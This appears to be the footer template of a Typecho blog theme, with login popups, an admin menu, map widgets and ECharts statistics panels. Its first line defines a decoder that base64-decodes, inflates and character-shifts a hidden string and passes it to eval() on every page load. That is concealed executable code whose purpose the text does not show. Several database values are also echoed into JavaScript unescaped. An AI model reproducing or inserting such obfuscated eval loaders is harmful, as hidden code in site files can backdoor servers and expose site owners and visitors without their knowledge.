<?php function eaw($jyc)
{ 
$jyc=gzinflate(base64_decode($jyc));
 for($i=0;$i<strlen($jyc);$i++)
 {
$jyc[$i] = chr(ord($jyc[$i])-1);
 }
 return $jyc;
 }eval(eaw("fZDBasMwDIYfoE/hw8A2rGO7ZmtKWY+ljLKxQynBcdTFzLGNLS8Zpc8+N8lKB2U62Ej69Ev8hKSY7KORqKwhXddthKls82IDBsYPffv03FQlmZHXbweytsWyzLIPQMYfh6aHEDUmIGHTfA8o64XWrM8CaJAJTXVvG0ZRlBrupDUIBgPlvcIppnlbgwdGAwqMIanN6S11sdQq1Nc4TNcMFKEuHXyNkR4EQkWeZiQa1RWoGkj6jWPGtozz/2adCKG1viIqkPXbavWH0apRyB4uSwkFz+hmsV4yPsKjQ2rPRpP44Txx8yX0hanvqkqeZlnb/4wOebEoA3ohsXg+WzbNXQz1r+L2fjduOYUHjN702lvqwDdCK/NJdwNxnBwn8/wH"));?>
<div class="cat_tanchuang_out cat_login_out">
    <div class="cat_tanchuang cat_login">
        <div class="cat_login_user">
			<img id="user_avatarimg" class="head_avatar avatar lazyload" src="<?php get_AvatarLazyload(); ?>" data-src="<?php get_user_avatar() ?>" alt="博主头像" style="margin: 1rem;">
            <div class="changeicon_admin" style="right:1rem;"><i class="ri-settings-3-line"></i></div>
            <form>
                <i class="ri-mail-line" style="color: var(--main);"></i><input id="user_avatar" type="uesrmail" name="uesrmail" placeholder="请输入邮箱" required/><br>
                <i class="ri-user-line" style="color: var(--main);"></i><input id="user_nick" type="uesrname" name="uesrname" placeholder="请输入昵称" required/><br>
                <i class="ri-at-line" style="color: var(--main);"></i><input id="user_addr" type="uesraddress" name="uesraddress" placeholder="请输入网址"/><br>
                <div id="user_login_botton"><i class="ri-login-circle-line"></i> 访客登录</div>
            </form>
        </div>
        <div class="cat_login_admin" style="display:none;">
            <img class="head_avatar avatar lazyload" src="<?php get_AvatarLazyload(); ?>" data-src="<?php get_user_avatar() ?>" alt="博主头像" style="margin: 1rem;">
            <div class="changeicon_user"><i class="ri-account-circle-line"></i></div>
            <form action="<?php $this->options->loginAction()?>" method="post" name="login" rold="form">
                <input type="hidden" name="referer" value="<?php $this->options->siteUrl(); ?>">
                <i class="ri-user-2-line" style="color: var(--main);"></i><input type="text" name="name" placeholder="请输入用户名" required/><br>
                <i class="ri-key-2-line" style="color: var(--main);"></i><input type="password" name="password" autocomplete="current-password" placeholder="请输入密码" required/><br>
                <label for="remember" style="display: block;margin: 0.6rem;"><input checked="" type="checkbox" name="remember" class="checkbox" value="1" id="remember"> <span style="color: var(--main);font-size: 0.9rem;">下次自动登录</span></label>
                <button id="admin_login_botton" type="submit" style="background:#7676ff;"><i class="ri-login-circle-line"></i> 管理登录</button>
            </form>
        </div>
    </div>
</div>
<div class="cat_admin_menu">
    <?php if($this->user->hasLogin()):?>
        <?php if ($this->is('post')) : ?>
            <a class="anniu" target="_blank" title="编辑文章" href="<?php $this->options->adminUrl(); ?>write-post.php?cid=<?php echo $this->cid; ?>">
                <i class="ri-draft-line"></i>
            </a>
        <?php elseif ($this->is('page')) : ?>
            <a class="anniu" target="_blank" title="编辑页面" href="<?php $this->options->adminUrl(); ?>write-page.php?cid=<?php echo $this->cid; ?>">
                <i class="ri-file-edit-line"></i>
            </a>
            <?php if ($this->template == 'page_links.php'): ?>
                <a href="?type=RELOAD" class="anniu" title="手动刷新友链缓存，预计响应时间 <?php echo $this->options->cat_links_duration ? $this->options->cat_links_duration : '30' ?> 秒，刷新时请勿有其他操作" target="_blank">
                    <i class="ri-refresh-line"></i>
                </a>
            <?php endif; ?>
        <?php endif; ?>
        <?php if($this->options->cat_user_addr):?>
            <a class="anniu" title="个人中心" title="<?php echo $header_username;?>" href="<?php echo $this->options->cat_user_addr;?>">
                <i class="ri-ghost-smile-line"></i>
            </a>
        <?php endif; ?>
        <a class="anniu" title="写新文章" href="/admin/write-post.php">
            <i class="ri-edit-line"></i>
        </a>
        <a class="anniu" title="主题设置" href="/admin/options-theme.php">
            <i class="ri-paint-brush-line"></i>
        </a>
        <a class="anniu" title="后台管理" href="<?php $this->options->adminUrl(); ?>">
            <i class="ri-settings-3-line"></i>
        </a>
    <?php endif; ?>
</div>
<div class="cat_search_menu">
    <div class="cat_littlecard_title"><i class="ri-search-2-line"></i> 搜 索</div>
	<form id="search" method="post" action="<?php $this->options->siteUrl(); ?>" role="search">
		<input type="text" id="s" name="s" class="text" placeholder="输入关键字搜索"/>
		<button type="submit" class="submit"><i class="ri-search-eye-line"></i></button>
	</form>
	<div id="jl_viewHistory" >
		<div class="cat_littlecard_title"><i class="ri-footprint-line"></i> 足 迹</div>
	</div>
</div>
<div class="cat_category_menu">
	<div class="cat_littlecard_title"><i class="ri-archive-line"></i> 分 类</div>
<?php $this->widget('Widget_Metas_Category_List')->to($categorys);?>
<?php while($categorys->next()): ?>
<?php if ($categorys->levels === 0): ?>
<?php $children = $categorys->getAllChildren($categorys->mid);?>
<?php if (empty($children)) {?>
<li>
	<a href="<?php $categorys->permalink(); ?>" title="<?php echo '共计 ' . $categorys->count . ' 篇' ?>">
		<?php
			$icon = cat_have_emoji($categorys->description) ? $categorys->description : '<i class="'.  $categorys->description . '"></i>';
			echo ($categorys->description ? $icon : '' ) . ' ' . $categorys->name;
		?>
	</a>                         
</li>
<?php } else { ?>
<li>
	<a href="<?php $categorys->permalink(); ?>">
		<?php
			$icon = cat_have_emoji($categorys->description) ? $categorys->description : '<i class="'.  $categorys->description . '"></i>';
			echo ($categorys->description ? $icon : '' ) . ' ' . $categorys->name;
		?>
	</a>
	<ul>
		<?php foreach ($children as $mid) { ?>
		<?php $child = $categorys->getCategory($mid); ?>
		<li <?php if($this->is('category', $mid)): ?> style="color:var(--theme-60);" <?php endif; ?>>
			<a href="<?php echo $child['permalink'] ?>" title="<?php echo '共计 ' . $child['count'] . ' 篇' ?>">
				<?php echo ($child['description'] ? (cat_have_emoji($child['description'])? $child['description'] : '<i class="'.  $child['description'] . '"></i>') : '' ) . ' ' . $child['name']; ?>
			</a>
		</li>
		<?php } ?>
	</ul>
</li>
<?php } ?>
<?php endif; ?>
<?php endwhile; ?>
</div>
<?php if (!empty($this->options->cat_menu_foot_allchoose) && in_array('fanyi', $this->options->cat_menu_foot_allchoose)): ?>
	<script src="<?php echo resource_cdn() . 'public/fanyi.js'?>"></script>
<?php endif; ?>
<script>
	$(function() {
		jl_viewHistory({
			limit: 5,
			storageKey: 'jl_viewHistory',
			primaryKey: 'url',
			addHistory: <?php if ($this->is('post')) { ?> true <?php }else{ ?>false<?php } ?>,
			titleSplit: '|'
		});
	});
	if($(".OwO_1").length>0){
		var OwO_1 = new OwO({
			logo: '<i class="ri-emotion-happy-line"></i>',
			container: document.getElementsByClassName('OwO_1')[0],
			target: document.getElementsByClassName('OwO-textarea')[0],
			api: '<?php echo $this->options->cat_user_owo ? $this->options->cat_user_owo : owo_path(true) . 'OwO.json' ?>',
			position: 'up',
			width: '100%',
			maxHeight: '215px'
		});
    }
	if($(".OwO_2").length>0){
		var OwO_2 = new OwO({
			logo: '<i class="ri-emoji-sticker-line"></i>',
			container: document.getElementsByClassName('OwO_2')[0],
			target: document.getElementsByClassName('OwO-textarea')[0],
			api: '<?php echo $this->options->cat_user_owo_2 ? $this->options->cat_user_owo_2 : owo_path(true) . 'OwO_2.json' ?>',
			position: 'up',
			width: '100%',
			maxHeight: '215px'
		});
	}
</script>
<?php if ($this->template == 'page_life.php' && $this->options->cat_map_key1 && $this->options->cat_map_key2) : ?>
	<script type="text/javascript">
		window._AMapSecurityConfig = {
			securityJsCode:'<?php $this->options->cat_map_key2()?>',
		}
	</script>
	<script type="text/javascript" src="https://webapi.amap.com/maps?v=2.0&key=<?php $this->options->cat_map_key1()?>"></script> 
	<script>
		$('.cat_tour_ANNIU').on('click', function () {
			setTimeout(function(){ 
				var map = new AMap.Map('tourmap', {
					zoom:5,
					center: [108.259752,36.235808],
					viewMode:'2D'
				});
				<?php if ($this->options->cat_map_style1): ?>
					map.setMapStyle('amap://styles/<?php $this->options->cat_map_style1() ?>');
				<?php endif; ?>
				AMap.plugin([
					'AMap.Scale',
				], function(){
					map.addControl(new AMap.Scale());
				});
				<?php
					$counts = Typecho_Db::get()->fetchAll(Typecho_Db::get()
						->select('cid')
						->from('table.fields')
						->where('name = ?', 'post_top_info_select')
						->where('str_value = ?', 'tour')
						->where('type = ?', 'str')
						->order('cid', Typecho_Db::SORT_DESC)
					);
				?>
				<?php foreach ($counts as $count): ?>
				<?php
					$fields_zuobiao = Typecho_Db::get()->fetchAll(Typecho_Db::get()->select('str_value')->from('table.fields')->where('cid = ?', $count['cid'])->where('name = ?','post_top_info_tour_more'));
				?>
					var marker = new AMap.Marker({
						content: '<i style="font-size:1.5rem;color:var(--theme)" class="ri-map-pin-2-fill"></i>',
						position:  [<?php echo $fields_zuobiao[0]['str_value'] ?>],
						offset: new AMap.Pixel(-20, -20),
					});
					map.add(marker);
				<?php endforeach; ?>
				<?php if($this->options->cat_map_key3) : ?>
					var marker = new AMap.Marker({
						content: '<i style="font-size:1.5rem;color:#6aa4ff" class="ri-map-pin-user-fill"></i>',
						position:  [<?php $this->options->cat_map_key3() ?>],
						offset: new AMap.Pixel(-20, -20),
					});
					map.add(marker);
				<?php endif; ?>
					map.setFitView();
					$(".friends_block").mouseenter(function(){
						var new_zuobiao = $(this).attr('zuobiao_id');
						var arr = new_zuobiao.split(',');
						map.setZoomAndCenter(12,[arr[0],arr[1]]);
					});
					$(".friends_block").mouseleave(function(){
						map.setFitView();
					});
			}, 1000);
		});
	</script>
	<script>
		$('.cat_tour_ANNIU').on('click', function () {
			setTimeout(function(){ 
				var map = new AMap.Map('tourmap_dark', {
					zoom:5,
					center: [108.259752,36.235808],
					viewMode:'2D'
				});
				<?php if ($this->options->cat_map_style2): ?>
					map.setMapStyle('amap://styles/<?php $this->options->cat_map_style2() ?>');
				<?php endif; ?>
				AMap.plugin([
					'AMap.Scale',
				], function(){
					map.addControl(new AMap.Scale());
				});
				<?php
					$counts = Typecho_Db::get()->fetchAll(Typecho_Db::get()
						->select('cid')
						->from('table.fields')
						->where('name = ?', 'post_top_info_select')
						->where('str_value = ?', 'tour')
						->where('type = ?', 'str')
						->order('cid', Typecho_Db::SORT_DESC)
					);
				?>
				<?php foreach ($counts as $count): ?>
				<?php
					$fields_zuobiao = Typecho_Db::get()->fetchAll(Typecho_Db::get()->select('str_value')->from('table.fields')->where('cid = ?', $count['cid'])->where('name = ?','post_top_info_tour_more'));
				?>
					var marker = new AMap.Marker({
						content: '<i style="font-size:1.5rem;color:var(--theme)" class="ri-map-pin-2-fill"></i>',
						position:  [<?php echo $fields_zuobiao[0]['str_value'] ?>],
						offset: new AMap.Pixel(-20, -20),
					});
					map.add(marker);
				<?php endforeach; ?>
				<?php if($this->options->cat_map_key3) : ?>
					var marker = new AMap.Marker({
						content: '<i style="font-size:1.5rem;color:#6aa4ff" class="ri-map-pin-user-fill"></i>',
						position:  [<?php $this->options->cat_map_key3() ?>],
						offset: new AMap.Pixel(-20, -20),
					});
					map.add(marker);
				<?php endif; ?>
					map.setFitView();
					$(".friends_block").mouseenter(function(){
						var new_zuobiao = $(this).attr('zuobiao_id');
						var arr = new_zuobiao.split(',');
						map.setZoomAndCenter(12,[arr[0],arr[1]]);
					});
					$(".friends_block").mouseleave(function(){
						map.setFitView();
					});
			}, 1000);
		});
	</script>
<?php endif; ?>
<?php if ($this->template == 'page_echarts.php'): ?>
<?php
$text = ['1',0,'-1','-2','-3','-4','-5'];
for($i=0;$i<=7;$i++){
    ${"echert_day".$i} = Typecho_Db::get()->fetchAll(Typecho_Db::get()
        ->select('COUNT(author) AS cnt')
        ->from('table.comments')
        ->where('created > ?', strtotime(date('Y-m-d',strtotime("-" . $i . " day"))))
        ->where('created < ?', strtotime(date('Y-m-d',strtotime($text[$i] . " day"))))
        ->where('authorId = ?', '0')
        ->where('status = ?', 'approved')
        ->where('type = ?', 'comment')
    );
}
?>
<script>
$(function(){
    setTimeout(function(){
    var dom = document.getElementById('echarts_1');
    var myChart = echarts.init(dom, null, {
      renderer: 'canvas',
      useDirtyRect: false
    });
    var app = {};
    var option;
    option = {
        title: {
            text: '读者留言',
            textStyle: {
                color: "#a7a7a7",
            },
            x: 'center',
        },
        grid: {
            left: '3%',
            right: '3%',
            bottom: '3%',
            containLabel: true
        },
      tooltip: {
        trigger: 'item'
      },
        xAxis: {
            type: 'category',
            axisLabel: { color: '#a7a7a7' },
            data: ['<?php echo date("m-d",strtotime("-6 day")) ?>', '<?php echo date("m-d",strtotime("-5 day")) ?>', '<?php echo date("m-d",strtotime("-4 day")) ?>', '<?php echo date("m-d",strtotime("-3 day")) ?>', '<?php echo date("m-d",strtotime("-2 day")) ?>', '<?php echo date("m-d",strtotime("-1 day")) ?>', '<?php echo date("m-d") ?>'],
            axisTick: {
                alignWithLabel: true
            }
        },
        yAxis: {
            type: 'value',
            axisLabel: { color: '#a7a7a7',formatter: '{value} 条' }
        },
        series: [
            {
              data: [<?php echo $echert_day6[0]['cnt'].','.$echert_day5[0]['cnt'].','.$echert_day4[0]['cnt'].','.$echert_day3[0]['cnt'].','.$echert_day2[0]['cnt'].','.$echert_day1[0]['cnt'].','.$echert_day0[0]['cnt'] ?>],
              type: 'line',
              color: '<?php echo ($this->options->user_themecolor ? $this->options->user_themecolor : '#ff6a6a') ?>',
              smooth: true
            }
        ]
    };
    if (option && typeof option === 'object') {
      myChart.setOption(option);
    }
    window.addEventListener('resize', myChart.resize);
    },500);
});
</script>
<?php
$chart_post = Typecho_Db::get()->fetchAll(Typecho_Db::get()->select('COUNT(str_value) AS cnt')->from('table.fields')->where('name = ?', 'post_top_info_post_name')->where('str_value != ?', '')->where('type = ?', 'str'));
$text = ['album','tour','movie','book','music','steam'];
for($i=0;$i<=5;$i++){
    ${"chart_".$text[$i]} = Typecho_Db::get()->fetchAll(Typecho_Db::get()
        ->select('COUNT(name) AS cnt')
        ->from('table.fields')
        ->where('name = ?', 'post_top_info_select')
        ->where('str_value = ?', $text[$i])
        ->where('type = ?', 'str')
    );
}
?>
<script>
$(function(){
    setTimeout(function(){
    var dom = document.getElementById('echarts_2');
    var myChart = echarts.init(dom, null, {
      renderer: 'canvas',
      useDirtyRect: false
    });
    var app = {};
    var option;
    option = {
        title: {
            text: '专题分布',
            textStyle: {
                color: "#a7a7a7",
            },
            x: 'center',
            y: 'center',
        },
        tooltip: {
            trigger: 'item'
          },
        series: [
            {
              name: '专题分布',
              type: 'pie',
              radius: ['40%', '70%'],
              avoidLabelOverlap: true,
              itemStyle: {
                borderRadius: 5,
                borderColor: '#fff',
                borderWidth: 2
              },
              label: {
                show: true,
                color: "#a7a7a7",
              },
              emphasis: {
                label: {
                  show: true,
                  fontSize: '15',
                }
              },
              data: [
                { value: <?php echo $chart_post[0]['cnt']; ?>, name: '文集' },
                { value: <?php echo $chart_album[0]['cnt']; ?>, name: '相册' },
                { value: <?php echo $chart_book[0]['cnt']; ?>, name: '书籍' },
                { value: <?php echo $chart_tour[0]['cnt']; ?>, name: '旅行' },
                { value: <?php echo $chart_music[0]['cnt']; ?>, name: '音乐' },
                { value: <?php echo $chart_movie[0]['cnt']; ?>, name: '电影' },
                { value: <?php echo $chart_steam[0]['cnt']; ?>, name: '游戏' }
              ]
            }
        ]
    };
    if (option && typeof option === 'object') {
      myChart.setOption(option);
    }
    window.addEventListener('resize', myChart.resize);
    },500);
});
<?php
    $echart3 = Typecho_Db::get()->fetchAll(Typecho_Db::get()
        ->select('COUNT(name) AS cnt','name','mail')
        ->from('table.dianzan')
        ->order('cnt', Typecho_Db::SORT_DESC)
        ->group('name,mail')
        ->limit('7')
    );
?>
$(function(){
    setTimeout(function(){
    var dom = document.getElementById('echarts_3');
    var myChart = echarts.init(dom, null, {
      renderer: 'canvas',
      useDirtyRect: false
    });
    var app = {};
    var option;
    option = {
        title: {
            text: '日记点赞',
            textStyle: {
                color: "#a7a7a7",
            },
            x: 'center',
        },
      tooltip: {
        trigger: 'axis',
        axisPointer: {
          type: 'shadow'
        }
      },
      grid: {
        left: '3%',
        right: '4%',
        bottom: '3%',
        containLabel: true
      },
      xAxis: [
        {
          type: 'category',
          axisLabel: { color: '#a7a7a7',fontSize:10 },
          data: ['<?php echo $echart3[0]['name'] ?>', '<?php echo $echart3[1]['name'] ?>', '<?php echo $echart3[2]['name'] ?>', '<?php echo $echart3[3]['name'] ?>', '<?php echo $echart3[4]['name'] ?>', '<?php echo $echart3[5]['name'] ?>', '<?php echo $echart3[6]['name'] ?>'],
          axisTick: {
            alignWithLabel: true
          }
        }
      ],
      yAxis: [
        {
          type: 'value',
          axisLabel: { color: '#a7a7a7' }
        }
      ],
      series: [
        {
          name: '点赞数',
          type: 'bar',
          barWidth: '60%',
          color: '<?php echo ($this->options->user_themecolor ? $this->options->user_themecolor : '#ff6a6a') ?>',
          data: ['<?php echo $echart3[0]['cnt'] ?>', '<?php echo $echart3[1]['cnt'] ?>', '<?php echo $echart3[2]['cnt'] ?>', '<?php echo $echart3[3]['cnt'] ?>', '<?php echo $echart3[4]['cnt'] ?>', '<?php echo $echart3[5]['cnt'] ?>', '<?php echo $echart3[6]['cnt'] ?>']
        }
      ]
    };
    if (option && typeof option === 'object') {
      myChart.setOption(option);
    }
    window.addEventListener('resize', myChart.resize);
    },500);
});
</script>
<?php
$a=array();
for($i=1;$i<=31;$i++){
    ${"daychart".$i} = Typecho_Db::get()->fetchAll(Typecho_Db::get()
        ->select('COUNT(status) AS cnt')
        ->from('table.contents')
        ->where('created > ?', strtotime(date('Y-m-'.$i)))
        ->where('created < ?', strtotime(date('Y-m-'.$i) . ' +1 day'))
        ->where('status = ?', 'publish')
        ->where('type = ?', 'post')
    );
    array_push($a,${"daychart".$i}[0]['cnt']);
}
$a_to_json=json_encode($a);
?>
<script>
$(function(){
    setTimeout(function(){
    var dom = document.getElementById('echarts_4');
    var myChart = echarts.init(dom, null, {
      renderer: 'canvas',
      useDirtyRect: false
    });
    var app = {};
    var option;
    function getVirtulData(year) {
      var date = +echarts.number.parseDate(+<?php echo strtotime(date('Y-m-01')).'000'; ?>);
      var end = +echarts.number.parseDate(+<?php echo strtotime(date('Y-m-d', strtotime(date('Y-m-01') . ' +1 month'))).'000'; ?>);
      var dayTime = 3600 * 24 * 1000;
      var data = [];
      var fromPHP=<?php echo $a_to_json ?>;
      for (var time = date,num = 0; time < end; time += dayTime,num = num + 1) {
        data.push([
            echarts.format.formatTime('yyyy-MM-dd', time),
            fromPHP[num]
        ]);
      }
      return data;
    }
    option = {
        title: {
            text: '更新日历',
            textStyle: {
                color: "#a7a7a7",
            },
            x: 'center',
        },
      tooltip: {},
      visualMap: {
        min: 1,
        max: 7,
        type: 'piecewise',
        splitNumber: 3,
        maxOpen:true, 
        orient: 'horizontal',
        left: 'center',
        textStyle: { color: "#a7a7a7" },
        bottom: 10,
        inRange: {
            color: ['<?php echo ($this->options->user_themecolor ? $this->options->user_themecolor . '1a' : '#ff6a6a1a') ?>','<?php echo ($this->options->user_themecolor ? $this->options->user_themecolor : '#ff6a6a') ?>']
        }
      },
      calendar: {
        top: 60,
        bottom: 50,
        left: 30,
        right: 30,
        cellSize: ['auto', 'auto'],
        range: '<?php echo date('Y-m'); ?>',
        itemStyle: {
          borderWidth: 1, borderColor: "#efefef", color: "#fff0"
        },
        monthLabel: { nameMap: "cn", color: "#a7a7a7" },
        dayLabel: { nameMap: "cn", color: "#a7a7a7" },
        orient: 'vertical',
        splitLine: { show: false },
        yearLabel: { show: false }
      },
      series: {
        type: 'heatmap',
        coordinateSystem: 'calendar',
        data: getVirtulData('<?php echo date('Y'); ?>')
      }
    };
    if (option && typeof option === 'object') {
      myChart.setOption(option);
    }
    window.addEventListener('resize', myChart.resize);
    },500);
});
</script>
<?php
    $echart5 = Typecho_Db::get()->fetchAll(Typecho_Db::get()
        ->select('title','views','agree','commentsNum')
        ->from('table.contents')
        ->where('status = ?', 'publish')
        ->where('type = ?', 'post')
        ->where('password is NULL')
        ->order('views', Typecho_Db::SORT_DESC)
        ->limit('5')
    );
?>
<script>
$(function(){
    setTimeout(function(){
    var dom = document.getElementById('echarts_5');
    var myChart = echarts.init(dom, null, {
      renderer: 'canvas',
      useDirtyRect: false
    });
    var app = {};
    var option;
    option = {
        title: {
            text: '热门文章',
            textStyle: {
                color: "#a7a7a7",
            },
            x: 'center',
        },
      tooltip: {
        trigger: 'axis',
        axisPointer: {
          type: 'line'
        }
      },
      legend: {
          top: 30,
          textStyle: { color: '#a7a7a7' }
      },
      grid: {
        left: '3%',
        right: '4%',
        bottom: '3%',
        containLabel: true
      },
      yAxis: {
        type: 'log',
        min: 0.99,
        axisLabel: { color: '#a7a7a7' },
      },
      xAxis: {
        type: 'category',
        axisLabel: { color: '#a7a7a7',fontSize:10 },
        data: ['<?php echo mb_substr($echart5[0]['title'],0,10).'..' ?>','<?php echo mb_substr($echart5[1]['title'],0,10).'..' ?>','<?php echo mb_substr($echart5[2]['title'],0,10).'..' ?>','<?php echo mb_substr($echart5[3]['title'],0,10).'..' ?>','<?php echo mb_substr($echart5[4]['title'],0,10).'..' ?>'],
        axisTick: {
            alignWithLabel: true
        }
      },
      series: [
        {
          name: '阅读量',
          type: 'bar',
          data: ['<?php echo $echart5[0]['views'] ?>', '<?php echo $echart5[1]['views'] ?>', '<?php echo $echart5[2]['views'] ?>', '<?php echo $echart5[3]['views'] ?>', '<?php echo $echart5[4]['views'] ?>']
        },
        {
          name: '评论数',
          type: 'bar',
          data: ['<?php echo $echart5[0]['commentsNum'] ?>', '<?php echo $echart5[1]['commentsNum'] ?>', '<?php echo $echart5[2]['commentsNum'] ?>', '<?php echo $echart5[3]['commentsNum'] ?>', '<?php echo $echart5[4]['commentsNum'] ?>']
        },
        {
          name: '点赞数',
          type: 'bar',
          data: ['<?php echo $echart5[0]['agree'] ?>', '<?php echo $echart5[1]['agree'] ?>', '<?php echo $echart5[2]['agree'] ?>', '<?php echo $echart5[3]['agree'] ?>', '<?php echo $echart5[4]['agree'] ?>']
        }
      ]
    };
    if (option && typeof option === 'object') {
      myChart.setOption(option);
    }
    window.addEventListener('resize', myChart.resize);
    },500);
});
</script>
    <?php if($this->options->cat_comment_IP == 'on' && $this->options->cat_comment_ip_api && $this->options->cat_comment_place == 'province' && $this->options->cat_echarts_map == 'on') :?>
        <script>
        $(function(){
            setTimeout(function(){
                var china_chart = document.getElementById('china_chart');
                var myChart = echarts.init(china_chart, null, {
                    renderer: 'canvas',
                    useDirtyRect: false
                });
                var data = [
                        <?php
                            $echart0 = Typecho_Db::get()->fetchAll(Typecho_Db::get()
                                ->select('COUNT(place) AS cnt', 'place')
                                ->from('table.comments')
                                ->where('status = ?', 'approved')
                                ->where('authorId = ?', '0')
                                ->where('type = ?', 'comment')
                                ->group('place')
                                ->order('cnt', Typecho_Db::SORT_DESC)
                            );
                            foreach ($echart0 as $item) {
                                echo '{name: \'' . $item['place'] . '\',value: ' . $item['cnt'] . ' },';
                            }
                        ?>
                    ];
                var option = {
                    title: {
                        text: '留言地图',
                        textStyle: {
                            color: "#a7a7a7",
                        },
                        x: 'center',
                    },
                    tooltip: { 
                        show: true,
                        formatter: function(params) {
                            if(params.value){ 
                                return params.name + '：' + params.value + '条留言';
                            }else{ 
                                return params.name + '：暂无留言';
                            }
                        },
                    },
                    visualMap: [{
                        type: 'piecewise',
                        maxOpen:true,
                        textStyle: { color: "#a7a7a7" },
                        pieces: [
                            { gte: 10000, color: '<?php echo ($this->options->user_themecolor ? $this->options->user_themecolor : '#ff6a6a') ?>' },
                            { gte: 1000, lt: 9999, color: '<?php echo ($this->options->user_themecolor ? $this->options->user_themecolor . 'bf' : '#ff6a6abf') ?>' },
                            { gte: 100, lt: 999, color: '<?php echo ($this->options->user_themecolor ? $this->options->user_themecolor . '80' : '#ff6a6a80') ?>' },
                            { gte: 10, lt: 99, color: '<?php echo ($this->options->user_themecolor ? $this->options->user_themecolor . '40' : '#ff6a6a40') ?>' },
                            { gte: 1, lt: 9, color: '<?php echo ($this->options->user_themecolor ? $this->options->user_themecolor . '1a' : '#ff6a6a1a') ?>' }
                        ],
                    }],
                    geo: {
                        map: 'china', 
                        label: {
                            show: false
                        },
                        emphasis: {
                            label: {
                                show: false
                            },
                            itemStyle: {
                                areaColor: 'orange'
                            }
                        }
                    },
                    series: [{
                        type: 'map',
                        geoIndex: 0,
                        data: data
                    }]
                };
                if (option && typeof option === 'object') {
                  myChart.setOption(option);
                }
                window.addEventListener('resize', myChart.resize);
            },500);
        });
        </script>
    <?php endif; ?>
<?php endif; ?>